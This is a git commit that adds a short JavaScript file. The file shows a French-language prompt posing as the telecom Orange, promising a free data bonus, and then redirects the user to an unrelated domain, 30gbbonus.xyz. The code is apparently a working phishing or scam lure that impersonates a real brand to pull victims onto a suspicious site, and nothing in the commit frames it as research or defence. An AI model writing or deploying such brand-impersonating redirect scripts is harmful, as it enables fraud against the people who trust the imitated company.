c591393e108a20536ba28c03da01341bdc99e2ee
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-05-02 13:48:22 -0700

    Update and rename wfpsc2.js to orange-google.js

---
+++ orange-google.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('ORANGE : Cher client, veuillez vérifier si votre carte SIM est éligible à notre récompense Orange 5 Go - 10 Go pour les anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/orange-4g';
+}
